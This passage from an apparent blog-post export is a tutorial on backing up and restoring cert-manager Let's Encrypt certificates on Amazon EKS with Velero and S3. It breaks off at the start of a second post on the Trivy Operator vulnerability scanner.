+0100", "content": "In a previous post, ‚ÄúCheapest Amazon EKS‚Äù, I used cert-manager to obtain a wildcard certificate for the ingress. When using Let‚Äôs Encrypt production certificates, it can be handy to back them up and restore them if the cluster needs to be recreated. Here are a few steps on how to install Velero and the backup and restore procedure for cert-manager objects. Links: Backup and Restore Resources Requirements An Amazon EKS cluster (as described in ‚ÄúCheapest Amazon EKS)‚Äù Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Create Let‚Äôs Encrypt production certificate These steps should be done only once. Generating production-ready Let‚Äôs Encrypt certificates should generally be done only once. The goal is to back up the certificate and then restore it whenever it‚Äôs needed for a ‚Äúnew‚Äù cluster. Create a Let‚Äôs Encrypt production ClusterIssuer: tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-clusterissuer-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-production-dns namespace: cert-manager labels: letsencrypt: production spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: ${MY_EMAIL} privateKeySecretRef: name: letsencrypt-production-dns solvers: - selector: dnsZones: - ${CLUSTER_FQDN} dns01: route53: region: ${AWS_DEFAULT_REGION} EOF kubectl wait --namespace cert-manager --timeout=15m --for=condition=Ready clusterissuer --all Create a new certificate and have it signed by Let‚Äôs Encrypt to validate it: if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-weekly-backup-cert-manager; then tee \"${TMP_DIR}/${CLUSTER_FQDN}/k8s-cert-manager-certificate-production.yml\" &lt;&lt; EOF | kubectl apply -f - apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: ingress-cert-production namespace: cert-manager labels: letsencrypt: production spec: secretName: ingress-cert-production secretTemplate: labels: letsencrypt: production issuerRef: name: letsencrypt-production-dns kind: ClusterIssuer commonName: \"*.${CLUSTER_FQDN}\" dnsNames: - \"*.${CLUSTER_FQDN}\" - \"${CLUSTER_FQDN}\" EOF kubectl wait --namespace cert-manager --for=condition=Ready --timeout=10m certificate ingress-cert-production fi Create S3 bucket The following step should be done only once. Use CloudFormation to create an S3 bucket that will be used to store backups from Velero. if ! aws s3 ls \"s3://${CLUSTER_FQDN}\"; then cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Parameters: S3BucketName: Description: Name of the S3 bucket Type: String EmailToSubscribe: Description: Confirm subscription over email to receive a copy of S3 events Type: String Resources: S3Bucket: Type: AWS::S3::Bucket Properties: BucketName: !Ref S3BucketName PublicAccessBlockConfiguration: BlockPublicAcls: true BlockPublicPolicy: true IgnorePublicAcls: true RestrictPublicBuckets: true LifecycleConfiguration: Rules: - Id: TransitionToOneZoneIA Status: Enabled Transitions: - TransitionInDays: 30 StorageClass: ONEZONE_IA - Id: DeleteOldObjects Status: Enabled ExpirationInDays: 90 BucketEncryption: ServerSideEncryptionConfiguration: - ServerSideEncryptionByDefault: SSEAlgorithm: aws:kms KMSMasterKeyID: alias/aws/s3 NotificationConfiguration: TopicConfigurations: - Event: s3:ObjectCreated:* Topic: !Ref S3ChangeNotificationTopic - Event: s3:ObjectRemoved:* Topic: !Ref S3ChangeNotificationTopic - Event: s3:ReducedRedundancyLostObject Topic: !Ref S3ChangeNotificationTopic - Event: s3:LifecycleTransition Topic: !Ref S3ChangeNotificationTopic - Event: s3:LifecycleExpiration:* Topic: !Ref S3ChangeNotificationTopic S3ChangeNotificationTopic: Type: AWS::SNS::Topic Properties: TopicName: !Join [\"-\", !Split [\".\", !Sub \"${S3BucketName}\"]] DisplayName: S3 Change Notification Topic KmsMasterKeyId: alias/aws/sns S3ChangeNotificationSubscription: Type: AWS::SNS::Subscription Properties: TopicArn: !Ref S3ChangeNotificationTopic Protocol: email Endpoint: !Ref EmailToSubscribe SNSTopicPolicyResponse: Type: AWS::SNS::TopicPolicy Properties: Topics: - !Ref S3ChangeNotificationTopic PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Principal: \"*\" Action: SNS:Publish Resource: !Ref S3ChangeNotificationTopic Condition: ArnLike: aws:SourceArn: !Sub arn:${AWS::Partition}:s3:::${S3BucketName} SNSTopicPolicy: Type: AWS::SNS::TopicPolicy Properties: Topics: - !Ref S3ChangeNotificationTopic PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Principal: Service: s3.amazonaws.com Action: sns:Publish Resource: !Ref S3ChangeNotificationTopic Condition: ArnEquals: aws:SourceArn: !GetAtt S3Bucket.Arn S3Policy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"${S3BucketName}-s3\" Description: !Sub \"Policy required by Velero to write to S3 bucket ${S3BucketName}\" PolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Action: - s3:ListBucket - s3:GetBucketLocation - s3:ListBucketMultipartUploads Resource: !GetAtt S3Bucket.Arn - Effect: Allow Action: - s3:PutObject - s3:GetObject - s3:DeleteObject - s3:ListMultipartUploadParts - s3:AbortMultipartUpload Resource: !Sub \"arn:aws:s3:::${S3BucketName}/*\" # S3 Bucket policy does not deny HTTP requests - Sid: ForceSSLOnlyAccess Effect: Deny Action: \"s3:*\" Resource: - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}\" - !Sub \"arn:${AWS::Partition}:s3:::${S3Bucket}/*\" Condition: Bool: aws:SecureTransport: \"false\" Outputs: S3PolicyArn: Description: The ARN of the created Amazon S3 policy Value: !Ref S3Policy S3Bucket: Description: The name of the created Amazon S3 bucket Value: !Ref S3Bucket S3ChangeNotificationTopicArn: Description: ARN of the SNS Topic for S3 change notifications Value: !Ref S3ChangeNotificationTopic EOF aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides S3BucketName=\"${CLUSTER_FQDN}\" EmailToSubscribe=\"${MY_EMAIL}\" \\ --stack-name \"${CLUSTER_NAME}-s3\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-s3.yml\" fi Install Velero Before installing Velero, it‚Äôs necessary to create an IAM Roles for Service Accounts (IRSA) with an S3 policy. The created velero ServiceAccount will be specified in the Velero Helm chart later. S3_POLICY_ARN=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-s3\" --query \"Stacks[0].Outputs[?OutputKey==\\`S3PolicyArn\\`].OutputValue\" --output text) eksctl create iamserviceaccount --cluster=\"${CLUSTER_NAME}\" --name=velero --namespace=velero --attach-policy-arn=\"${S3_POLICY_ARN}\" --role-name=\"eksctl-${CLUSTER_NAME}-irsa-velero\" --approve 2023-03-23 20:13:12 [‚Ñπ] 3 existing iamserviceaccount(s) (cert-manager/cert-manager,external-dns/external-dns,karpenter/karpenter) will be excluded 2023-03-23 20:13:12 [‚Ñπ] 1 iamserviceaccount (velero/velero) was included (based on the include/exclude rules) 2023-03-23 20:13:12 [!] serviceaccounts that exist in Kubernetes will be excluded, use --override-existing-serviceaccounts to override 2023-03-23 20:13:12 [‚Ñπ] 1 task: { 2 sequential sub-tasks: { create IAM role for serviceaccount \"velero/velero\", create serviceaccount \"velero/velero\", } }2023-03-23 20:13:12 [‚Ñπ] building iamserviceaccount stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:13:13 [‚Ñπ] deploying stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:13:13 [‚Ñπ] waiting for CloudFormation stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:13:43 [‚Ñπ] waiting for CloudFormation stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:14:34 [‚Ñπ] waiting for CloudFormation stack \"eksctl-k01-addon-iamserviceaccount-velero-velero\" 2023-03-23 20:14:34 [‚Ñπ] created namespace \"velero\" 2023-03-23 20:14:35 [‚Ñπ] created serviceaccount \"velero/velero\" Install the velero Helm chart and modify its default values: # renovate: datasource=helm depName=velero registryUrl=https://vmware-tanzu.github.io/helm-charts VELERO_HELM_CHART_VERSION=\"7.2.1\" helm repo add --force-update vmware-tanzu https://vmware-tanzu.github.io/helm-charts cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" &lt;&lt; EOF initContainers: - name: velero-plugin-for-aws # renovate: datasource=docker depName=velero/velero-plugin-for-aws extractVersion=^(?&lt;version&gt;.+)$ image: velero/velero-plugin-for-aws:v1.10.1 volumeMounts: - mountPath: /target name: plugins metrics: serviceMonitor: enabled: true prometheusRule: enabled: true spec: - alert: VeleroBackupPartialFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} partially failed backups. expr: |- velero_backup_partial_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning - alert: VeleroBackupFailures annotations: message: Velero backup {{ \\$labels.schedule }} has {{ \\$value | humanizePercentage }} failed backups. expr: |- velero_backup_failure_total{schedule!=\"\"} / velero_backup_attempt_total{schedule!=\"\"} &gt; 0.25 for: 15m labels: severity: warning configuration: backupStorageLocation: - name: provider: aws bucket: ${CLUSTER_FQDN} prefix: velero config: region: ${AWS_DEFAULT_REGION} volumeSnapshotLocation: - name: provider: aws config: region: ${AWS_DEFAULT_REGION} serviceAccount: server: # Use exiting IRSA service account create: false name: velero credentials: useSecret: false # Create scheduled backup to periodically backup the \"production\" certificate in the \"cert-manager\" namespace every night: schedules: weekly-backup-cert-manager: labels: letsencrypt: production schedule: \"@weekly\" template: includedNamespaces: - cert-manager includedResources: - certificates.cert-manager.io - clusterissuers.cert-manager.io - secrets labelSelector: matchLabels: letsencrypt: production EOF helm upgrade --install --version \"${VELERO_HELM_CHART_VERSION}\" --namespace velero --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-velero.yml\" velero vmware-tanzu/velero Add the Velero Grafana Dashboard: # renovate: datasource=helm depName=kube-prometheus-stack registryUrl=https://prometheus-community.github.io/helm-charts KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION=\"56.6.2\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" &lt;&lt; EOF grafana: dashboards: default: 15469-kubernetes-addons-velero-stats: # renovate: depName=\"Velero Exporter Overview\" gnetId: 15469 revision: 1 datasource: Prometheus EOF helm upgrade --install --version \"${KUBE_PROMETHEUS_STACK_HELM_CHART_VERSION}\" --namespace kube-prometheus-stack --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-kube-prometheus-stack-velero-cert-manager.yml\" kube-prometheus-stack prometheus-community/kube-prometheus-stack Backup cert-manager objects These steps should be done only once. Verify that the backup-location is set properly to AWS S3 and is available: velero get backup-location NAME PROVIDER BUCKET/PREFIX PHASE LAST VALIDATED ACCESS MODE DEFAULT default aws k01.k8s.mylabs.dev/velero Available 2023-03-23 20:16:20 +0100 CET ReadWrite true Initiate the backup process and save the necessary cert-manager objects to S3: if ! aws s3 ls \"s3://${CLUSTER_FQDN}/velero/backups/\" | grep -q velero-weekly-backup-cert-manager; then velero backup create --labels letsencrypt=production --ttl 2160h0m0s --from-schedule velero-weekly-backup-cert-manager fi Check the backup details: velero backup describe --selector letsencrypt=production --details Name: velero-weekly-backup-cert-manager-20230323191755 Namespace: velero Labels: letsencrypt=production velero.io/schedule-name=velero-weekly-backup-cert-manager velero.io/storage-location=default Annotations: velero.io/source-cluster-k8s-gitversion=v1.25.6-eks-48e63af velero.io/source-cluster-k8s-major-version=1 velero.io/source-cluster-k8s-minor-version=25+ Phase: Completed Errors: 0 Warnings: 0 Namespaces: Included: cert-manager Excluded: &lt;none&gt; Resources: Included: certificates.cert-manager.io, clusterissuers.cert-manager.io, secrets Excluded: &lt;none&gt; Cluster-scoped: auto Label selector: letsencrypt=production Storage Location: default Velero-Native Snapshot PVs: auto TTL: 720h0m0s CSISnapshotTimeout: 10m0s Hooks: &lt;none&gt; Backup Format Version: 1.1.0 Started: 2023-03-23 20:17:55 +0100 CET Completed: 2023-03-23 20:17:56 +0100 CET Expiration: 2023-04-22 21:17:55 +0200 CEST Total items to be backed up: 2 Items backed up: 2 Resource List: cert-manager.io/v1/Certificate: - cert-manager/ingress-cert-production v1/Secret: - cert-manager/ingress-cert-production Velero-Native Snapshots: &lt;none included&gt; View the files in the S3 bucket: aws s3 ls --recursive \"s3://${CLUSTER_FQDN}/velero/backups\" 2023-03-23 20:17:57 3388 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-backup.json 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-csi-volumesnapshotclasses.json.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-csi-volumesnapshotcontents.json.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-csi-volumesnapshots.json.gz 2023-03-23 20:17:57 2545 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-logs.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-podvolumebackups.json.gz 2023-03-23 20:17:57 99 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-resource-list.json.gz 2023-03-23 20:17:57 49 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-results.gz 2023-03-23 20:17:57 29 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755-volumesnapshots.json.gz 2023-03-23 20:17:57 8369 velero/backups/velero-weekly-backup-cert-manager-20230323191755/velero-weekly-backup-cert-manager-20230323191755.tar.gz Restore cert-manager objects The following steps will show how to restore a Let‚Äôs Encrypt production certificate (previously backed up by Velero to S3) to a new cluster. Start the restore procedure for the cert-manager objects: velero restore create --from-schedule velero-weekly-backup-cert-manager --labels letsencrypt=production --wait View details about the restore process: velero restore describe --selector letsencrypt=production --details Name: velero-weekly-backup-cert-manager-20230323202248 Namespace: velero Labels: letsencrypt=production Annotations: &lt;none&gt; Phase: Completed Total items to be restored: 2 Items restored: 2 Started: 2023-03-23 20:22:51 +0100 CET Completed: 2023-03-23 20:22:52 +0100 CET Backup: velero-weekly-backup-cert-manager-20230323191755 Namespaces: Included: all namespaces found in the backup Excluded: &lt;none&gt; Resources: Included: * Excluded: nodes, events, events.events.k8s.io, backups.velero.io, restores.velero.io, resticrepositories.velero.io, csinodes.storage.k8s.io, volumeattachments.storage.k8s.io, backuprepositories.velero.io Cluster-scoped: auto Namespace mappings: &lt;none&gt; Label selector: &lt;none&gt; Restore PVs: auto Existing Resource Policy: &lt;none&gt; Preserve Service NodePorts: auto Verify that the certificate was restored properly: kubectl describe certificates -n cert-manager ingress-cert-production Name: ingress-cert-production Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-weekly-backup-cert-manager-20230323194540 velero.io/restore-name=velero-weekly-backup-cert-manager-20230324051646 Annotations: &lt;none&gt; API Version: cert-manager.io/v1 Kind: Certificate ... ... ... Spec: Common Name: *.k01.k8s.mylabs.dev Dns Names: *.k01.k8s.mylabs.dev k01.k8s.mylabs.dev Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Secret Name: ingress-cert-production Secret Template: Labels: Letsencrypt: production Status: Conditions: Last Transition Time: 2023-03-24T05:16:48Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2023-06-21T18:10:31Z Not Before: 2023-03-23T18:10:32Z Renewal Time: 2023-05-22T18:10:31Z Events: &lt;none&gt; Reconfigure ingress-nginx The previous steps restored the Let‚Äôs Encrypt production certificate cert-manager/ingress-cert-production. Let‚Äôs configure ingress-nginx to use this certificate. Check the current ‚Äústaging‚Äù certificate - this will be replaced by the ‚Äúproduction‚Äù one: while ! curl -sk \"https://${CLUSTER_FQDN}\" &gt; /dev/null; do date sleep 5 done openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=2 C = US, O = (STAGING) Internet Security Research Group, CN = (STAGING) Pretend Pear X1 verify error:num=20:unable to get local issuer certificate verify return:0 ... --- Server certificate subject=/CN=*.k01.k8s.mylabs.dev issuer=/C=US/O=(STAGING) Let's Encrypt/CN=(STAGING) Artificial Apricot R3 --- ... Configure ingress-nginx to use the production Let‚Äôs Encrypt certificate: # renovate: datasource=helm depName=ingress-nginx registryUrl=https://kubernetes.github.io/ingress-nginx INGRESS_NGINX_HELM_CHART_VERSION=\"4.9.1\" cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" &lt;&lt; EOF controller: extraArgs: default-ssl-certificate: cert-manager/ingress-cert-production EOF helm upgrade --install --version \"${INGRESS_NGINX_HELM_CHART_VERSION}\" --namespace ingress-nginx --reuse-values --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-ingress-nginx-production-certs.yml\" ingress-nginx ingress-nginx/ingress-nginx The production certificate should now be active: openssl s_client -connect \"${CLUSTER_FQDN}:443\" &lt; /dev/null depth=2 C = US, O = Internet Security Research Group, CN = ISRG Root X1 verify return:1 depth=1 C = US, O = Let's Encrypt, CN = R3 verify return:1 depth=0 CN = *.k01.k8s.mylabs.dev ... --- Server certificate subject=/CN=*.k01.k8s.mylabs.dev issuer=/C=US/O=Let's Encrypt/CN=R3 --- ... Here is the report from SSL Labs: Rotation of the ‚Äúproduction‚Äù certificate Let‚Äôs Encrypt certificates are valid for 90 days. It is necessary to renew them before they expire. Here are a few commands showing details after cert-manager has renewed the certificate. Examine the certificate details: kubectl describe certificates -n cert-manager ingress-cert-production ... Status: Conditions: Last Transition Time: 2023-09-13T04:50:19Z Message: Certificate is up to date and has not expired Observed Generation: 1 Reason: Ready Status: True Type: Ready Not After: 2023-12-12T03:53:45Z Not Before: 2023-09-13T03:53:46Z Renewal Time: 2023-11-12T03:53:45Z Revision: 1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Issuing 58m cert-manager-certificates-trigger Renewing certificate as renewal was scheduled at 2023-09-09 13:39:16 +0000 UTC Normal Reused 58m cert-manager-certificates-key-manager Reusing private key stored in existing Secret resource \"ingress-cert-production\" Normal Requested 58m cert-manager-certificates-request-manager Created new CertificateRequest resource \"ingress-cert-production-1\" Normal Issuing 55m cert-manager-certificates-issuing The certificate has been successfully issued Look at the CertificateRequest details: kubectl describe certificaterequests -n cert-manager ingress-cert-production-1 Name: ingress-cert-production-1 Namespace: cert-manager Labels: letsencrypt=production velero.io/backup-name=velero-weekly-backup-cert-manager-20230711144135 velero.io/restore-name=velero-weekly-backup-cert-manager-20230913045017 Annotations: cert-manager.io/certificate-name: ingress-cert-production cert-manager.io/certificate-revision: 1 cert-manager.io/private-key-secret-name: ingress-cert-production-kxk5s API Version: cert-manager.io/v1 Kind: CertificateRequest Metadata: Creation Timestamp: 2023-09-13T04:50:19Z Generation: 1 Owner References: API Version: cert-manager.io/v1 Block Owner Deletion: true Controller: true Kind: Certificate Name: ingress-cert-production UID: b04e1186-e6c5-42d0-8d61-34810644b386 Resource Version: 8653 UID: b9c209b3-0bac-440d-a62f-91800c6c458b Spec: Extra: authentication.kubernetes.io/pod-name: cert-manager-f9f87498d-nvggh authentication.kubernetes.io/pod-uid: 3b1a2731-0e75-4cf2-bdbd-7278ac364498 Groups: system:serviceaccounts system:serviceaccounts:cert-manager system:authenticated Issuer Ref: Kind: ClusterIssuer Name: letsencrypt-production-dns Request: LS0xxxxxxxS0K UID: 8704d6db-816e-4c93-bcc8-8801060b05d0 Username: system:serviceaccount:cert-manager:cert-manager Status: Certificate: LSxxxxxxCg== Conditions: Last Transition Time: 2023-09-13T04:50:19Z Message: Certificate request has been approved by cert-manager.io Reason: cert-manager.io Status: True Type: Approved Last Transition Time: 2023-09-13T04:53:46Z Message: Certificate fetched from issuer successfully Reason: Issued Status: True Type: Ready Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-ca Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-acme Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-vault Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-selfsigned Not signing CertificateRequest until it is Approved Normal WaitingForApproval 54m cert-manager-certificaterequests-issuer-venafi Not signing CertificateRequest until it is Approved Normal cert-manager.io 54m cert-manager-certificaterequests-approver Certificate request has been approved by cert-manager.io Normal OrderCreated 54m cert-manager-certificaterequests-issuer-acme Created Order resource cert-manager/ingress-cert-production-1-3932937138 Normal OrderPending 54m cert-manager-certificaterequests-issuer-acme Waiting on certificate issuance from order cert-manager/ingress-cert-production-1-3932937138: \"\" Normal CertificateIssued 50m cert-manager-certificaterequests-issuer-acme Certificate fetched from issuer successfully Check the cert-manager logs for renewal activity: kubectl logs -n cert-manager cert-manager-f9f87498d-nvggh ... I0913 04:50:18.960223 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Ready\" to 2023-09-13 04:50:18.960211036 +0000 UTC m=+451.003679107 I0913 04:50:18.962295 1 trigger_controller.go:194] \"cert-manager/certificates-trigger: Certificate must be re-issued\" key=\"cert-manager/ingress-cert-production\" reason=\"Renewing\" message=\"Renewing certificate as renewal was scheduled at &lt;nil&gt;\" I0913 04:50:18.962464 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Issuing\" to 2023-09-13 04:50:18.962457264 +0000 UTC m=+451.005925351 I0913 04:50:19.011897 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Ready\" to 2023-09-13 04:50:19.011889134 +0000 UTC m=+451.055357214 I0913 04:50:19.020026 1 trigger_controller.go:194] \"cert-manager/certificates-trigger: Certificate must be re-issued\" key=\"cert-manager/ingress-cert-production\" reason=\"Renewing\" message=\"Renewing certificate as renewal was scheduled at &lt;nil&gt;\" I0913 04:50:19.020061 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Issuing\" to 2023-09-13 04:50:19.020054522 +0000 UTC m=+451.063522609 I0913 04:50:19.046907 1 trigger_controller.go:194] \"cert-manager/certificates-trigger: Certificate must be re-issued\" key=\"cert-manager/ingress-cert-production\" reason=\"Renewing\" message=\"Renewing certificate as renewal was scheduled at 2023-09-09 13:39:16 +0000 UTC\" I0913 04:50:19.046942 1 conditions.go:203] Setting lastTransitionTime for Certificate \"ingress-cert-production\" condition \"Issuing\" to 2023-09-13 04:50:19.046937063 +0000 UTC m=+451.090405134 I0913 04:50:19.134032 1 conditions.go:263] Setting lastTransitionTime for CertificateRequest \"ingress-cert-production-1\" condition \"Approved\" to 2023-09-13 04:50:19.134023095 +0000 UTC m=+451.177491158 I0913 04:50:19.175761 1 conditions.go:263] Setting lastTransitionTime for CertificateRequest \"ingress-cert-production-1\" condition \"Ready\" to 2023-09-13 04:50:19.175750564 +0000 UTC m=+451.219218635 I0913 04:50:19.210564 1 conditions.go:263] Setting lastTransitionTime for CertificateRequest \"ingress-cert-production-1\" condition \"Ready\" to 2023-09-13 04:50:19.210549558 +0000 UTC m=+451.254017629 I0913 04:53:46.526286 1 acme.go:233] \"cert-manager/certificaterequests-issuer-acme/sign: certificate issued\" resource_name=\"ingress-cert-production-1\" resource_namespace=\"cert-manager\" resource_kind=\"CertificateRequest\" resource_version=\"v1\" related_resource_name=\"ingress-cert-production-1-3932937138\" related_resource_namespace=\"cert-manager\" related_resource_kind=\"Order\" related_resource_version=\"v1\" I0913 04:53:46.526563 1 conditions.go:252] Found status change for CertificateRequest \"ingress-cert-production-1\" condition \"Ready\": \"False\" -&gt; \"True\"; setting lastTransitionTime to 2023-09-13 04:53:46.526554494 +0000 UTC m=+658.570022573 Back up the certificate before deleting the cluster (in case it was renewed): if [[ \"$(kubectl get --raw /api/v1/namespaces/cert-manager/services/cert-manager:9402/proxy/metrics | awk '/certmanager_http_acme_client_request_count.*acme-v02\\.api.*finalize/ { print $2 }')\" -gt 0 ]]; then velero backup create --labels letsencrypt=production --ttl 2160h0m0s --from-schedule velero-weekly-backup-cert-manager fi Clean-up Remove files from the ${TMP_DIR}/${CLUSTER_FQDN} directory: for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{aws-s3,helm_values-{ingress-nginx-production-certs,kube-prometheus-stack-velero-cert-manager,velero},k8s-cert-manager-clusterissuer-production}.yml; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done Enjoy ‚Ä¶ üòâ" }, { "title": "Trivy Operator Dashboard in Grafana", "url": "/posts/trivy-operator-grafana/", "categories": "Kubernetes, Amazon EKS, Security", "tags": "Amazon EKS, k8s, kubernetes, grafana, trivy-operator, dashboard", "date": "2023-03-08 00:00:00 +0100", "content": "In a previous post, ‚ÄúCheapest Amazon EKS‚Äù, I installed the kube-prometheus-stack to enable cluster monitoring, which includes Grafana, Prometheus, and a few other components. Many tools allow you to scan container images and display their vulnerabilities, such as Trivy, Grype, or Clair. Unfortunately, there are not as many open-source (OSS) tools that can show vulnerabilities of container images running inside Kubernetes (K8s). This capability is usually a paid offering from third-party vendors like Palo Alto Networks, Aqua Security, Wiz, and many others. Let‚Äôs look at the Trivy Operator, which can help you build your Kubernetes cluster‚Äôs security posture (covering Compliance, Vulnerabilities, RBAC, and more). I‚Äôll walk you through the installation process, its integration with Prometheus and Grafana, and some examples to help you better understand how it works. Links: Trivy Operator Dashboard in Grafana Kubernetes Benchmark Scans with Trivy: CIS and NSA Reports Requirements An Amazon EKS cluster with the kube-prometheus-stack installed (as described in ‚ÄúCheapest Amazon EKS)‚Äù Helm The following variables are used in the subsequent steps: export AWS_DEFAULT_REGION=\"${AWS_DEFAULT_REGION:-us-east-1}\" export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Install Trivy Operator Install the trivy-operator Helm chart and modify its default values: # renovate: datasource=helm depName=trivy-operator registryUrl=https://aquasecurity.github.io/helm-charts/ TRIVY_OPERATOR_HELM_CHART_VERSION=\"0.20.6\" helm repo add --force-update aqua https://aquasecurity.github.io/helm-charts/ cat &gt; \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-trivy-operator.yml\" &lt;&lt; EOF serviceMonitor: enabled: true trivy: ignoreUnfixed: true EOF helm upgrade --install --version \"${TRIVY_OPERATOR_HELM_CHART_VERSION}\" --namespace trivy-system --create-namespace --wait --values \"${TMP_DIR}/${CLUSTER_FQDN}/helm_values-trivy-operator.yml\" trivy-operator aqua/trivy-operator Once the Helm chart is installed, you can see the trivy-operator initiating scans: kubectl get pods -n trivy-system NAME READY STATUS RESTARTS AGE node-collector-7555455fcf-q4dp6 0/1 Completed 0 11s node-collector-7f544b4779-7p5zr 0/1 Completed 0 11s scan-vulnerabilityreport-55bc49bd77-nr5br 0/2 Init:0/1 0 9s scan-vulnerabilityreport-594f6f446-v64sp 0/1 Init:0/1 0 2s scan-vulnerabilityreport-65cd458f97-6zbs8 0/3 Init:0/1 0 4s scan-vulnerabilityreport-6d9888f48-vrtxg 0/4 Init:0/1 0 2s scan-vulnerabilityreport-74b9cf67dd-mpqgj 0/1 Init:0/1 0 11s scan-vulnerabilityreport-77875c6784-vwkv2 0/1 Init:0/1 0 1s scan-vulnerabilityreport-7bd5758c7b-5wjqq 0/1 Init:0/1 0 8s scan-vulnerabilityreport-7dc9c49c47-gfrlk 0/3 Init:0/1 0 6s scan-vulnerabilityreport-978494f65-ggd8g 0/3 Init:0/1 0 7s scan-vulnerabilityreport-c7b7fbfdd-284zv 0/1 Init:0/1 0 5s trivy-operator-56bdc96f8-dls8c 1/1 Running 0 15s Trivy Operator details Let‚Äôs look at some examples to see how the Trivy Operator can help identify security issues in a Kubernetes cluster. The outputs below were generated on 2023-03-12 and will differ in the future. Vulnerability Reports Deploy a vulnerable (old) version of nginx:1.22.0 to the cluster: kubectl create namespace test-trivy1 kubectl run nginx --namespace=test-trivy1 --image=nginx:1.22.0 echo -n \"Waiting for trivy-operator to create VulnerabilityReports: \" until kubectl get vulnerabilityreports -n test-trivy1 -o go-template='{{.items | len}}' | grep -qxF 1; do echo -n \".\" sleep 3 done View a summary of the container image vulnerabilities present in the old version of nginx: kubectl get vulnerabilityreports -n test-trivy1 -o wide NAME REPOSITORY TAG SCANNER AGE CRITICAL HIGH MEDIUM LOW UNKNOWN pod-nginx-nginx library/nginx 1.22.0 